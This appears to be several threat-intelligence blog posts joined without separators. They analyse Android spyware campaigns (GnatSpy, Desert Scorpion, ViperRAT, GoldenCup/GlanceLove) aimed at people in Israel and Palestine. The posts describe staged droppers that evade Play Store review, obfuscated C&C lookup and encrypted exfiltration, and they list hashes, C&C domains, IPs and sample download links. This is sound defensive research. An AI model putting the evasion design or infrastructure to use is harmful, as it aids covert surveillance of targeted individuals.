Figures 1 and 2. Old and new receivers and services
The new code also makes much more use of Java annotations and reflection methods. We believe that this was done to evade attempts to detect these apps as malicious.
Figures 3 and 4. Java annotations and reflection methods
C&C servers
Earlier versions of VAMP contained the C&C server used in simple plain text, making detection by static analysis tools an almost trivial affair.
Figure 5. C&C server in plaintext
GnatSpy has changed this. The server is still hardcoded in the malicious app’s code, but is now encoded to evade easy detection:
Figures 6 and 7. Obfuscated C&C server
A function call is in the code to obtain the actual C&C URL:
Figures 8 and 9. Function call to obtain C&C server URL
The URL hardcoded in the malware is not the final C&C server, however. Accessing the above URL merely sends back the location of the actual C&C server:
Figures 10 and 11. Request and response pair for C&C server
The WHOIS information of the C&C domains used now uses domain privacy to conceal the registrant's contact information.
Figure 12. WHOIS information
It’s also worth noting that some of these C&C domains are newly registered, highlighting that these attackers are still active even though their activities have been reported:
Figure 13. Newly registered C&C domain
The domain names used are also curiously named. They used names of persons, but while some names appear to be those of real persons (or plausibly real names), others appear to have been directly taken from various television shows. The rationale for using these names remains unclear.
The version of Apache used has also been updated, from 2.4.7 to 2.4.18. All domains now forbid directory indexing; in at least one earlier C&C domain this was left enabled.
Figure 14. Directory indexing disabled
We note here that two of the C&C domains we encountered - specifically, cecilia-gilbert[.]com and lagertha-lothbrok[.]info - were also reported to be connected to VAMP and FrozenCell, respectively. This indicates that the threat actors behind GnatSpy are likely to be connected to these previous attacks, as well.
Increased compatibility and stolen information
Earlier samples called the System Manager on Huawei devices to grant permissions to itself:
Figure 15. Code calling app on Huawei devices
A similar line was added for Xiaomi devices:
Figure 16. Code calling app on Xiaomi devices
GnatSpy also includes several function calls targeting newer Android versions (Marshmallow and Nougat):
Figures 17 and 18. Code for Marshmallow and Nougat Android versions
More information about the device is stolen as well, including information about the battery, memory and storage usage, and SIM card status. Curiously, while previous samples collected information about the user’s location via OpenCellID, this is no longer done by GnatSpy.
Conclusion
Threat actors can be remarkably persistent even if their activities have been exposed and documented by researchers. This appears to be the case here. The threat actors behind GnatSpy are not only continuing their illicit activities, but they are also improving the technical capabilities of their malware.
Trend Micro™ Mobile Security for Android ™ detects these malicious apps. End users and enterprises can also benefit from its multilayered security capabilities that secure the device’s data and privacy, and safeguard them from ransomware, fraudulent websites, and identity theft.
For organizations, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning, as well as protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites.
Trend Micro’s Mobile App Reputation Service (MARS) covers Android and iOS threats using leading sandbox and machine learning technologies. It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability.
Indicators of Compromise
Apps/files with the following hashes are connected to GnatSpy:
SHA256
Package Name
Label
14c846939641eb575f78fc8f1ecb2dc76979a5e08366e1809be24fad240f6ad6
com.app.voice
Voice
1b1bff4127c9f868f14bc8f2526358cfc9ff1259b7069ab116e7c52e43f2c669
com.messenger.hike
Android Setting
1c0e3895f264ac51e185045aa2bf38102da5b340eb3c3c3f6aacb7476c294d62
com.app.updates
Messenger Update
22078e0d00d6a0f0441b3777e6a418170e3a9e4cce8141f0da8af044fdc1e266
com.myapps.update
Facebook Update
232807513c2d3e97bfcc64372d360bd9f7b6b782bd4083e91f09f2882818c0c5
com.myapps.update
WhatsApp Update
313ae27ec66e533f7224d99c1a0c254272818d031456359d3dc85f02f21fd992
com.app.go
Android Setting
377716c6a2b73c94d3307e9f2ea1a5b3774fa42df452c0867e7384eb45422e4f
com.apps.voice
Android Setting
3c604f5150ea1af994e7411e2816c277ff4f8a02b94d50b6cf4cc951430414bf
com.appdev.update
Android System
4842cff6fc7a7a413ceed132f735eee3121ffb03f98453dae966f900e341dd52
com.updates.voice
VoiceChat
4e681d242bebf64bbba3f0da91ad109dd14f26e97cd62f306e9fca1603a0009e
com.app.lets
Android Setting
544a1c303ef021f0d54e62a6147c7ae9cd0c84265e302f6da5ed08b616e45b78
com.myapps.update
Facebook Update
566385bff532d1eb26b49363b8d91ed6881f860ffa4b5ddb2bb5fe068bb6c87e
com.app.lets
Android Setting
58ddd057ec7f2420ce94cf3fc52794d0f62603ca7eaf8c5911f55b8b100ac493
com.chatts.me
Chat Me
5de5b948aeca6e0811f9625dec48601133913c24e419ce99f75596cb04503141
com.fakebook
App System Installer
6b0325b7020f203d38664be732145c5f9f95fda875c81d136b031618900210a4
com.myapps.update
Messenger Update
6befd9dac5286f72516bba531371dc7769d9efecf56c8a44ce0c8de164662c6b
com.app.go
Android Setting
76962d334b894349a512d8e533c8373b71389f1d20fd814cd8e7ecc89ed8530a
com.messenger.hike
Android Setting
8da31d3102524d6a2906d1ffa1118edf39cf54d72456937bfbae5546e09a3c32
com.app.go
Android Setting
91b3eeb8ba6853cab5f2669267cf9bccdba389149cc8b2c32656af62bd016b04
com.facebookupdate
Facebook Update
93da08ced346b9958e34bda4fe41062572253472c762a3a837e0dd368fffec8b
com.fakebook
Android Settings
a841b71431e19df7e925d10a6e43a965fc68ccbb6523b447de82c516cfba93a8
com.app.lets
Android Setting
af65aac4f3cf13c88422675b5261acc6c7b5d0af75323a516989a75b0374eddd
com.app.chat
b6326e17ec8307edf63e731c635fbfa8469d9264cb414592e2d2a5c71093d809
com.apps.voice
Android Setting
b7007d2039abaf8b8b0db77241d400a8c4d3b48c6fece5d80dc69905d4d272c3
com.apps.voice
Android Setting
c20438ba8c9e008c1e2eb4343f177757fc260437aeac52df61b156671b07ac14
com.myapps.update
Facebook Update
ca8d892a616feaf240bd9e05a250db8ed4d56b7db6348bbaa415dec1e0c626f3
com.app.voice
VoiceChat
ce4190030372465eceec60ec1687023c99f95a11b9a558f5431074de20747b81
com.app.update
WhatsApp Update
d17308fb06760de1b06d03448a01f3762f2712c1a66b50c8d5f4ac061d6deb27
com.apps.lets
Android Setting
e2cb9140c47492e7931e0b6629caf5c03cbc4e7a28c7976a28e3158b5d1c67fb
com.app.chatous
Android Setting
ebc338f3988e96e9fab53854428ea91dbabd3ee9875464008eafd52c687c3625
com.chat.bestchat
Best Chat
ec1ed9b064ffbd237e1808d4e156d011b8b77402042b7a6fee92923b69ba65d4
com.app.lets
Android Setting
efc4a2014f73996fb5d90406a55aa14ac89407fd03cfc89d18ee3251d9fd1af8
com.chat.bestchat
Best Chat
f890ba41f6d7d2f2fb4da477adc975be7a3b8068686ff5e863d1a53e56acdfac
com.facebook.update
Facebook Update
The following domains were used by various C&C servers:
aryastark[.]info
cecilia-gilbert[.]com
cerseilannister[.]info
claire-browne[.]info
daario-naharis[.]info
harvey-ross[.]info
jorah-mormont[.]info
kaniel-outis[.]info
kristy-milligan[.]website
lagertha-lothbrok[.]info
max-eleanor[.]info
olivia-hartman[.]info
ragnar-lothbrok[.]info
rose-sturat[.]info
saratancredi[.]info
useraccount[.]website
victor-stewart[.]infoLookout researchers have identified a new, highly targeted surveillanceware family known as Desert Scorpion in the Google Play Store. Lookout notified Google of the finding and Google removed the app immediately while also taking action on it in Google Play Protect. The app ties together two malware families - Desert Scorpion and another targeted surveillanceware family named FrozenCell - that we believe are being developed by a single, evolving surveillanceware actor called APT-C-23 targeting individuals in the Middle East.
We've seen this actor rely heavily on phishing campaigns to trick victims into downloading their malicious apps, specifically on Facebook. Even sophisticated actors are using lower cost, less technologically impressive means like phishing to spread their malware because it's cheap and very effective, especially on mobile devices where there are more ways to interact with a victim (messaging apps, social media apps, etc.), and less screen real estate for victims to identify potential indicators of a threat.
Lookout customers are protected against this threat and additionally we have included a list of IOCs at the end of this report.
The Dardesh app associated with Desert Scorpion.
The potential actor and who they target
Our current analysis strongly suggests Desert Scorpion is being deployed in targeted attacks against Middle Eastern individuals of interest specifically those in Palestine and has also been highlighted by other researchers . We have been able to tie the malware to a long-running Facebook profile that we observed promoting the first stage of this family, a malicious chat application called Dardesh via links to Google Play. The Lookout Threat Intelligence team identified that this same Facebook profile has also posted Google Drive links to Android malware belonging to the FrozenCell family attributed to APT-C-27. These factors, in combination with the fact that the command and control infrastructure used by Frozen Cell and Desert Scorpion resides in similar IP blocks, supports the theory that the same actor is responsible for operating, if not developing, both families.
What it does
The surveillance functionality of Desert Scorpion resides in a second stage payload that can only be downloaded if the victim has downloaded, installed, and interacted with the first-stage chat application. The chat application acts as a dropper for this second-stage payload app. At the time of writing Lookout has observed two updates to the Dardesh application, the first on February 26 and the second on March 28. The malicious capabilities observed in the second stage include the following:
If running on a Huawei device it will attempt to add itself to the protected list of apps able to run with the screen off
Encrypts some exfiltrated data
Desert Scorpion's second stage masquerades as a generic "settings" application. Curiously, several of these have included the world "Fateh" in their package name, which may be referring to the Fatah political party. Such references would be in line with FrozenCell's phishing tactics in which they used file names to lure people associated with the political party to open malicious documents. Desert Scorpion's second stage is capable of installing another non-malicious application (included in the second stage) which is highly specific to the Fatah political party and supports the targeting theory.
The Lookout Threat Intelligence team is increasingly seeing the same tradecraft, tactics, and procedures that APT-C-23 favors being used by other actors. The approach of separating malicious functionality out into separate stages that are later downloaded during execution and not present in the initial app published to the Google Play Store, combined with social engineering delivered via social media platforms like Facebook, requires minimal investment in comparison to premium tooling like Pegasus or FinFisher. As we've seen with actors like Dark Caracal, this low cost, low sophistication approach that relies heavily upon social engineering has still been shown to be highly successful for those operating such campaigns. Given previous operational security errors from this actor in the past which resulted in exfiltrated content being publicly accessible Lookout Threat Intelligence is continuing to map out infrastructure and closely monitor their continued evolution.
Desert Scorpion first stages
Google Play Services Instant Apps
com.metrial.setting
38c8aa9e26feb39a30c0f2a3f005d655346656ff
Google Docs
https://doc-04-9g-docs.googleusercontent[.]com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/khq1nnes98sbmo0hnca368hdr5d37lko/1521280800000/14075706053171650887/*/1cHHFMm-NiJejIE4xZxXHKGGYtxti4Gjs?e=download
Google Docs
https://drive.google[.]com/uc?authuser=0&id=1cHHFMm-NiJejIE4xZxXHKGGYtxti4Gjs&export=download
Google Drive
https://drive.google[.]com/uc?authuser=0&id=1cHHFMm - NiJejIE4xZxXHKGGYtxti4Gjs&export=downloadLookout researchers discovered samples belonging to the ViperRAT malware family, a known mobile advanced persistent threat (mAPT), in the Google Play Store. This is one of the few times we've seen an mAPT in an official app marketplace. We discovered two ViperRAT "chat" apps with over 1,000 combined downloads, and upon discovery, notified Google, who has since removed them from the Play Store.
Previously, the actors behind ViperRAT used phishing schemes to trick targets in the Israeli Defense Force into downloading surveillanceware. We believe the same actors are behind this instance of the malware in Google Play and are likely using the legitimacy of the Play Store to make their phishing attacks more successful. ViperRAT's history Early last year, Lookout researchers reported on the discovery ViperRAT , when it was used to target and spy on the Israeli Defense Force (IDF). The IDF personnel were compromised through social engineering when they were prompted to download third party chat apps by attackers posing as attractive young women. The young women would send a link to a target and persuade him to click on it and install the Trojanized app. The malware performed basic profiling of the device, and then under certain conditions attempted to download and install a much more comprehensive second stage surveillance component. This second stage provided an attacker with a considerable amount of control over a compromised device and Lookout's Threat Intelligence team uncovered nine secondary payload applications while investigation this actor. For the majority of 2017 ViperRAT activity has been sporadic, potentially due to the increased media attention around this malware family and the release of indicators of compromise that included associated domains. Despite this tapering off Lookout recently observed its appearance in the Google Play Store which we believe is a milestone for those deploying it. It is believed that social engineering still plays a significant role in these latest attacks, however by hosting them on the Google Play Store, ViperRAT samples are likely to appear much more credible. Moreover, victims were no longer required to enable third party installations. ViperRAT in Google Play As with earlier trojanized ViperRAT apps, the latest two that were identified on the Play Store were both custom chat apps. The first, VokaChat, had received between 500 - 1,000 downloads while the second, Chattak, listed the number of downloads as between 50 - 100. It is interesting that in these new samples, the chat functionality was fully implemented, something that is different from the previous samples. Furthermore, command and control infrastructure for the two samples remained active (at the time of writing) and even included the privacy statement that Google requires from developers who publish to the Play Store. The following domains have been attributed to these latest samples. Domain ‍ vokachat.website chatackapp.coms weetdroids.com Vokachat also makes use of the following project on firebase. https://console.firebase.google.com/project/vokachat/ ‍ ‍ The Motive There is currently no evidence to suggest the actor behind this new variant has deployed it against the Israeli Defence Forces. That said, whether intentionally, or due to a misconfiguration on server infrastructure, proper usage of the Chattak application that involves creating a user account, results in the app infrastructure serving up the details of what appears to be other users. Analysis of this shows that there are likely fake accounts (based on email addresses clearly being incorrect), and the recent chat applications do not contain any mechanism to prevent users from entering either fake email addresses or email addresses not under their control. It's currently unclear whether this new variant is targeting its attacks to Saudi Arabia or the wider Middle East region.
The actors behind this attack most likely moved to Google Play not because of their targets, but because it added credibility to their chat apps. Before, the actors would trick victims into downloading an additional chat app, which would then download the surveillanceware. Now, the victim is no longer required to enable third-party installations, indicating that the malware has become even more sophisticated than before. Independent of the target or motive of the attackers, ViperRAT in Google Play demonstrates the increasing sophistication of mobile threats. A malicious app that can be downloaded from the Google Play store is extremely dangerous, as users will not think twice about downloading it because of their trust in Google. This is alarming to us, because as attackers continually find new ways to add legitimacy to their malicious apps, thier phishing attacks will become more successful. SHA-1s
b2f720c52588459cb270ac793bd4d159cd86f171
0f87d079df4fceb763f2671db34c6a3eedeb5ee1
d5cd496c9832289f111afbb475ccd7a09d7d3d3c
320f48b39320b3b2467771ac37cbc3bc88dc8c9bPosted: 6 Jul, 2018 4 Min Read Expert Perspectives Subscribe Follow twitter linkedin GoldenCup: New Cyber Threat Targeting World Cup Fans As the World Cup launches, so does a new threat Officials from the Israeli Defense Force recently uncovered an Android Spyware campaign targeting Israeli soldiers and orchestrated by "Hamas." The latest samples attributed to this campaign were discovered by security researchers from ClearSky .
In our research, we focus on the most recent sample, an application dubbed as "Golden Cup", launched just before the start of World Cup 2018.
Distribution / Infection
When this campaign started at the start of 2018, the malware ("GlanceLove", "WinkChat") was distributed by the perpetrators mainly via fake Facebook profiles, attempting to seduce IDF soldiers to socialize on a different platform (their malware). As this approach was not a great success, their last attempt was to quickly create a World Cup app and this time distribute it to Israeli citizens, not just soldiers.
The official “Golden Cup” Facebook page. The short URL redirects to the application page at Google Play. We assume it was rushed because, unlike GlanceLove, it lacked any real obfuscation. Even the C&C server side was mostly exposed with the file listing available for everyone to traverse through it. It contained approximately 8GB of stolen data.
A recent whois of “goldncup.com”. Creation date is a week before the start of the tournament. How it Works
In order to get into the Google Play Store, the malware uses a phased approach which is quite a common practice for malware authors these days. The original app looks innocent, with most of its code aimed at implementing the real features that the app claims to provide. In addition, it collects identifiers and some data from the device.
After getting a command from the C&C, the app is able to download a malicious payload in the form of a .dex file that is being dynamically loaded adding the additional malicious capabilities.
In this way, the malware authors can submit their app and add the malicious capabilities only after their app is live on the Play Store.
Communication with the C&C
In order to communicate with its C&C, the app uses the MQTT (Message Queuing Telemetry Transport) protocol, which is transported over TCP port 1883.
Initiating the MQTT client.
Initiating the MQTT client. The app connects to the MQTT broker with hardcoded username and password and a unique device identifier generated for each device.
The MQTT connection to broker The MQTT communication is used primarily to update the device state and get commands from the C&C. It uses different topics that include the unique device identifier, which side is sending the message, and whether it is information message or command.
HTTP Communication
In addition to the MQTT communication, the app also uses plain text HTTP communication in order to download the .dex file and upload collected data.
All of the files that are being uploaded or downloaded are zip files encrypted by AES with ECB mode. The key for each file is generated randomly and stored in the encrypted file with a fixed offset.
In order to upload the file, the app uses a basic REST communication with the server, checking if the file exists and uploading it if it isn’t.
The path that is used for the uploads is:
http://<domain>/apps/d/p/op.php
The communication looks like this:
First Phase
The first phase of the app’s attack flow collects device information and a list of apps installed on the device. These are then uploaded to the C&C HTTP server.
The collection of basic device information. In addition, at this stage the app can process one of these commands:
• Collect device info
• Install app
• Is online?
• Change server domain
Out of these, the most interesting command is the “install app” command that downloads an encrypted zip file containing the second phase dex file, unpacks and loads it.
Second Phase
The second phase dex file contains 3 main services that are being used:
• ConnManager - handles connections to the C&C
• ReceiverManager - waits for incoming calls / app installations
• TaskManager - manages the data collection tasks
The C&C server address is different than the one that is used by the first phase, so the app reconnects to the new server as well as starts the periodic data collector tasks.
By analyzing the TaskManager class we can see the new commands that are supported at this stage:
As can be seen in the code snippet above, there are quite a lot of data collection tasks that are now available:
Collect device info
Track location
Upload contacts information
Upload sent and received SMS messages
Upload images
Upload video files
Send recursive dirlist of the external storage
Upload specific files
Record audio using the microphone
Record calls
Use the camera to capture bursts of snapshots
Those tasks can either run periodically, on event (such as incoming call) or when getting a command from the C&C server.
Mitigations
Stay protected from mobile malware by taking these precautions:
Do not download apps from unfamiliar sites
Only install apps from trusted sources
Pay close attention to the permissions requested by apps
Install a suitable mobile security app, such as SEP Mobile or Norton , to protect your device and data
Keep your operating system up to date
Make frequent backups of important data
Indicators of Compromise (IoCs)
Package names:
anew.football.cup.world.com.worldcup
com.coder.glancelove
com.winkchat
APK SHA2:
166f3a863bb2b66bda9c76dccf9529d5237f6394721f46635b053870eb2fcc5a b45defca452a640b303288131eb64c485f442aae0682a3c56489d24d59439b47 d9601735d674a9e55546fde0bffde235bc5f2546504b31799d874e8c31d5b6e9 2ce54d93510126fca83031f9521e40cd8460ae564d3d927e17bd63fb4cb20edc 67b1a1e7b505ac510322b9d4f4fc1e8a569d6d644582b588faccfeeaa4922cb7 1664cb343ee830fa94725fed143b119f7e2351307ed0ce04724b23469b9002f2
Loaded DEX SHA2:
afaf446a337bf93301b1d72855ccdd76112595f6e4369d977bea6f9721edf37e
Domain/IP:
goldncup[.]com
glancelove[.]com
autoandroidup[.]website
mobilestoreupdate[.]website
updatemobapp[.]website
107[.]175[.]144[.]26
192[.]64[.]114[.]147When the whistle of the first match of the 2018 World Cup blew, it didn’t just signal the start of an exciting tournament for football fans worldwide, but also gave the green light for threat actors to exploit this much anticipated event for their own gain.
Over the last few weeks, the Check Point Research team found a trend of threat actors exploiting the popularity of this year’s World Cup, including phishing campaigns as well as a highly invasive mobile espionage campaign, to lure potential victims.
At the start of this year’s tournament, a new phishing scheme exploited victims by enticing them to download an infected FIFA World Cup schedule and results checker onto their PCs. The campaign tried to peak their interest with an email subject line related to the world cup. When opened, the attachment used a known downloader of potentially unwanted programs (PUPs), called ‘DownloaderGuide’, which is most commonly used as an installer for applications such as toolbars, adware or system optimizers.
In a second phishing attack, a malicious executable was delivered, again using a schedule of the World Cup games to bait unsuspecting victims. This time, though, the malware used was intended to steal users’ login credentials from Chrome, Firefox and Outlook as well as log information about the infected computer and operating system itself.
Last week, Israeli security agencies announced that the Hamas terrorist organization had installed spyware on Israeli soldiers’ smartphones in its latest attempt to collect information on its long time enemy. About 100 people fell victim to the attack that came in the form of fake World Cup and online dating apps that had been uploaded to the Google Play Store, the official app store of Google. In fact, the oldest app was uploaded as early as November 2017, meaning it had hidden there, undetected, for several months.
Check Point researchers got hold of samples of the malware, dubbed ‘GlanceLove’, and analyzed its operation. In brief, this attack is a rare occurrence in which a fully operational Trojan managed to bypass Google Play’s protections. It also serves as a good example of how attackers make use of major events to attract potential victims and to hide within the scores of legitimate apps which relate to these events.
How The ‘GlanceLove’ Malware Operates
The attack begins when the user is lured from a seemingly innocent Facebook page and fake profiles promoting an app called ‘Golden Cup’. This is used to add credibility to the app and not raise any suspicions amongst its targets while the user is encouraged to proceed and download the app from Google Play. Earlier versions of the malware spread via similar tactics, disguised as dating and chat apps, called ‘Glance Love’ and ‘Wink Chat’.
Upon installation, the app requests the user to approve a long list of permissions, including access to the device’s network connection, contacts, SMSs, camera and external storage. These extensive permissions are used later for its malicious purpose. In fact, the app itself is completely benign, which is how it was able to infiltrate into Google Play despite Google’s protections. However, while the apps provide authentic functionalities, like ‘Golden Cup’ for example provides some World Cup related information, their actual purpose is to operate as droppers, and silently download and execute the malicious components of the attack without any user interaction at all.
Figure 1: Facebook profile promoting the malware.
Figure 2: Golden Cup app on Google Play.
‘Golden Cup’ then contacts its Command and Control server (C&C) and downloads another component in the form of a dex file from it. The dex file contains several malicious capabilities including stealing the device’s photos, contacts, SMS messages and location, which are all sent back to the C&C server along with details regarding the device’s properties. If certain conditions are met, the attacker orders the second component to download an additional apk file containing the third component of the attack, which has the greatest capabilities. To download, this component, the app requires user consent.
The last component has three main interfaces:
ReceiverManager : This interface allows for recording phone calls by listening to the devices microphone and also reports back to the server about any new app installed and any phone calls made on the device. This effectively allows it to eavesdrop on the user. This interface also allows to take photos via the device’s camera.
ConnectivityManager : This interface is responsible for communicating with the C&C server, which is different from the server used for earlier stages of the attack. The C&C The server can send the malware commands to collect information from the device, install additional apps, and even self-destruct (in an effort to leave behind no trace of it). This interface also sends the server a list of tasks to run on the device. The communication with the server is encrypted based on the AES algorithm, in which the app generates a random key, encrypts the data with it, and then stores the key between data chunks at an offset unique for the device.
TaskManager : This interface schedules data gathering instances and stores the collected information to files which are the uploaded to the server by the ConnectivityManager. Each data collection task can be enabled or disabled by a configuration command received from server.
Figure 3: Encryption code.
Figure 4: Diagram of GlanceLove’s operation flow.
What Is the ‘GlanceLove’ Malware Capable Of?
‘GlanceLove’ is a fully grown spyware, capable of pretty much anything.
To be more specific, the malware can conduct all of the following activities:
Record Calls . ‘GlanceLove’ waits for a notification from the ReceiverManager interface, indicating the user has picked up the phone, upon which the malware takes a photo one second later. It then starts to record the conversation for as long as the attacker chooses to record for.
Open Microphone . The malware periodically records audio from the device’s microphone with a predefined length and interval between recordings. Both the location and the microphone can be set to a “special mode” which enables more frequent recordings.
SMS Theft . The malware periodically collects SMS messages received or sent since the last time it collected them.
Take photos from the Camera . The malware silently takes photos from the camera and saves the images.
Storage Mapping. The malware collects the listing of all storage directories, including file names and sizes.
Steal Contacts. The malware collects information from the user’s contacts directory. It stores the names of the contact, its number and the time when the user last contacted it.
Steal Images . The malware collects images stored on the device and uploads them to the server. Additionally, it collects the images’ EXIF information, which indicates where the picture was taken.
Why Use Such a Complex Attack Structure?
There are several reasons for such an extensive build of the malware.
Each component is dedicated to a specific process, and is tailored accordingly.
The dropper must not include any malicious code itself to avoid detection, and is structured accordingly.
The separation between the two malicious components allows the hacker to maintain a low profile on most devices, and handpick the targets he wishes to spy on, making his information gathering focused and less demanding.
This strategy is called a “ chain attack ”, and is extremely successful for attackers as it allows cybercriminals to easily tweak or upgrade a component that has only been partially identified without abandoning the attack altogether. Furthermore, chain attack link structures lend themselves to being built with a more modular code, which makes it simpler for the malware to later evolve and accustom itself to new systems, targets and geographic regions. Additionally, chain attacks allow attackers to limit unnecessary spreading of the malware, which makes it harder for security vendors to obtain samples in order to fight it.
We would like to thank our colleague, Eyal Sela, at Clear Sky Cyber Security who helped contribute to this research.
Appendix 1: A list of Sha 256 hashes:
Name: WinkChat (App from Google Play)
Sha 256: 2ce54d93510126fca83031f9521e40cd8460ae564d3d927e17bd63fb4cb20edc
Package name: com.winkchat
Name: GlanceLove (App from Google Play)
Sha 256: 67b1a1e7b505ac510322b9d4f4fc1e8a569d6d644582b588faccfeeaa4922cb7
Package name: com.coder.glancelove
Name: World Cup (App from Google Play)
Sha 256 : 166f3a863bb2b66bda9c76dccf9529d5237f6394721f46635b053870eb2fcc5a
Package name: anew.football.cup.world.com.worldcup
Name: GlanceLove (App from Google Play)
Sha 256: d9601735d674a9e55546fde0bffde235bc5f2546504b31799d874e8c31d5b6e9
Package name: com.coder.glancelove
Name: GlanceLove (App from Google Play)
Sha 256: b45defca452a640b303288131eb64c485f442aae0682a3c56489d24d59439b47
Package name: com.coder.glancelove
Name: GlanceLove (App from Google Play)
Sha 256: 1664cb343ee830fa94725fed143b119f7e2351307ed0ce04724b23469b9002f2
Package name: com.coder.glancelove
Name: SoftwareUpdate (Payload)
Sha 256: 7c2c5909d86323c53830552b5e2fd130d2ed68fa22443e1bad22896e08f0a652
Package name: com.air.update
Name: System Update (Payload)
Sha 256: bcdeb31c0685667da5bf2b61bb0c7c7a00d76a8217d093713827dc5951cc98cb
Package name: com.system.update
Name: System Update (Payload)
Sha 256: 53482979ff5c40b93a6123c043a7deff01d085b08129f1931cfbbc541ba1ddf2
Package name: com.android.update
Name: System Update (Payload)This blog post was co-written by Irfan Asrar.
English soccer fans have enthusiastically enjoyed the team’s current run in the World Cup, as the tune “Three Lions” plays in their heads, while hoping to end 52 years of hurt. Meanwhile a recent spyware campaign distributed on Google Play has hurt fans of the beautiful game for some time. Using major events as social engineering is nothing new, as phishing emails have often taken advantage of disasters and sporting events to lure victims.
“Golden Cup” is the malicious app that installs spyware on victims’ devices. It was distributed via Google Play, and “offered” the opportunity to stream games and search for records from the current and past World Cups. McAfee Mobile Security identifies this threat as Android/FoulGoal.A; Google has removed the malicious applications from Google Play.
Once Golden Cup is installed it appears to be a typical sporting app, with multimedia content and general information about the event. Most of this data comes from a web service without malicious activity. However, in the background and without user consent the app silently transfers information to another server.
Data captured
Golden Cup captures a considerable amount of encrypted data from the victim’s device:
Phone number
Installed packages
Device model, manufacturer, serial number
Available internal storage capacity
Device ID
Android version
IMEI, IMSI
This spyware may be just the first stage of a greater infection due to its capability to load dex files from remote sources. The app connects to its control server and tries to download, unzip, and decrypt a second stage.
Android/FoulGoal.A detects when the screen is on or off and records this in its internal file scrn.txt, with the strings “on” or “off” to track when users are looking at their screens:
The Message Queuing Telemetry Transport protocol serves as the communication channel between the device and the malicious server to send and receive commands.
Data encryption
User data is encrypted with AES before it is sent to the control server. Cryptor class provides the encryption and decryption functionality. The doCrypto function is defined as a common function. As the first parameter of the function, “1” represents encryption and “2” is decryption mode:
The encryption key is generated dynamically using the SecureRandom function, which generates a unique value on the device to obfuscate the data. The addKey function embeds the encryption key into the encryption data. The data with the key is uploaded to the control server.
We believe the malware author uses this AES encryption technique for any information to be uploaded to escape the detection by Google Bouncer and network inspection products.
Our initial analysis suggests there were at least 300 infections, which we suspect occurred between June 8‒12, before the first World Cup matches began.
The second round
The second phase of the attack leverages an encrypted dex file. The file has a .data extension and is downloaded and dynamically loaded by the first-stage malware; it is extracted with the same mechanism used to upload the encrypted files. The location of the decryption key can be identified from the size of the contents and a fixed number in the first-stage malware.
After decryption, we can see out.dex in zipped format. The dex file has spy functions to steal SMS messages, contacts, multimedia files, and device location from infected devices.
The control server in second stage is different from the first stage’s. The encryption methodology and the server folder structures on the remote server are identical to the first stage.
We found one victim’s GPS location information and recorded audio files (.3gp) among the encrypted data on the control server.
Variants
We have also discovered two other variants of this threat created by the same authors and published to Google Play as dating apps. Although all the apps have been removed from Google Play, we still see indications of infections from our telemetry data, so we know these apps are active on some users’ devices.
Our telemetry data indicates that although users around the world have downloaded the app, the majority of downloads took place in the Middle East, most likely as a result of a World Cup–themed Twitter post in Hebrew directing people to download the app for a breakdown of the latest events.
McAfee Mobile Security users are protected against all the variants of this threat, detected as Android/FoulGoal.A.
Stay Updated
Follow us to stay updated on all things McAfee and on top of the latest consumer and mobile security threats.
Raj Samani is Chief Scientist and Fellow for the Enterprise business. He has assisted multiple law enforcement agencies in cybercrime cases and is a special advisor to the European Cybercrime...
Malicious PowerPoint Documents on the Rise
Authored by Anuradha M McAfee Labs have observed a new phishing campaign that utilizes macro capabilities available...
Sep 21, 2021 | 6 MIN READ
Android malware distributed in Mexico uses Covid-19 to steal financial credentials
Authored by Fernando Ruiz McAfee Mobile Malware Research Team has identified malware targeting Mexico. It poses as a security banking tool or...
Sep 13, 2021 | 7 MIN READ
Phishing Android Malware Targets Taxpayers in India
Authored by ChanUng Pak McAfee’s Mobile Research team recently found a new Android malware, Elibomi, targeting taxpayers in India. The malware steals sensitive financial and private information via...
Sep 03, 2021 | 8 MIN READ
The Rise of Deep Learning for Detection and Classification of Malware
Co-written by Catherine Huang, Ph.D. and Abhishek Karnik Artificial Intelligence (AI) continues to evolve and has made huge progress over the last decade. AI shapes our daily lives. Deep...
Aug 12, 2021 | 7 MIN READ
Scammers are Exploiting Ukraine Donations
Authored by Vallabh Chole and Oliver Devane Scammers are very quick at reacting to current events, so...
Apr 01, 2022 | 7 MIN READ
Imposter Netflix Chrome Extension Dupes 100k Users
Authored by Oliver Devane, Vallabh Chole, and Aayush Tyagi McAfee has recently observed several malicious Chrome Extensions...
Mar 10, 2022 | 8 MIN READ
Why Am I Getting All These Notifications on my Phone?
Authored by Oliver Devane and Vallabh Chole Notifications on Chrome and Edge, both desktop browsers, are commonplace,...
Feb 25, 2022 | 5 MIN READ
Emotet’s Uncommon Approach of Masking IP Addresses
In a recent campaign of Emotet, McAfee Researchers observed a change in techniques. The Emotet maldoc was...
Feb 04, 2022 | 4 MIN READ
HANCITOR DOC drops via CLIPBOARD
Hancitor, a loader that provides Malware as a Service, has been observed distributing malware such as FickerStealer,...
Dec 13, 2021 | 6 MIN READ
The Newest Malicious Actor: “Squirrelwaffle” Malicious Doc.
Authored By Kiran Raj Due to their widespread use, Office Documents are commonly used by Malicious actors...
Nov 10, 2021 | 4 MIN READ
Social Network Account Stealers Hidden in Android Gaming Hacking Tool
Authored by: Wenfeng Yu McAfee Mobile Research team recently discovered a new piece of malware that specifically...
Oct 19, 2021 | 6 MIN READ
Malicious PowerPoint Documents on the Rise
Authored by Anuradha M McAfee Labs have observed a new phishing campaign that utilizes macro capabilities available...
Sep 21, 2021 | 6 MIN READ
Android malware distributed in Mexico uses Covid-19 to steal financial credentials
Authored by Fernando Ruiz McAfee Mobile Malware Research Team has identified malware targeting Mexico. It poses as a security banking tool or...
Sep 13, 2021 | 7 MIN READ
Phishing Android Malware Targets Taxpayers in India
Authored by ChanUng Pak McAfee’s Mobile Research team recently found a new Android malware, Elibomi, targeting taxpayers in India. The malware steals sensitive financial and private information via...
Sep 03, 2021 | 8 MIN READ
The Rise of Deep Learning for Detection and Classification of Malware
Co-written by Catherine Huang, Ph.D. and Abhishek Karnik Artificial Intelligence (AI) continues to evolve and has made huge progress over the last decade. AI shapes our daily lives. Deep...
Aug 12, 2021 | 7 MIN READ
Scammers are Exploiting Ukraine Donations
Authored by Vallabh Chole and Oliver Devane Scammers are very quick at reacting to current events, so...
Apr 01, 2022 | 7 MIN READ
Imposter Netflix Chrome Extension Dupes 100k Users
